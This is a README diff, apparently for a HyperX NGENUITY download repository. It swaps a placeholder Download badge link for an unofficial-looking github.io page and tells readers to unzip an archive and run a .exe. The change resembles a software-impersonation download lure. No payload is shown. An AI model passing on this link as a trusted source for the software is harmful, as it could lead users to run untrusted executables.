@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install HyperX NGENUITY and automatically detect connected devices.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://hyperx-ngenuity-software.github.io/.github/)
 
 ## 📸 Overview
 ![hyperx-ngenuity-devices](https://github.com/user-attachments/assets/c184a619-5361-4878-9640-86d8353229df)
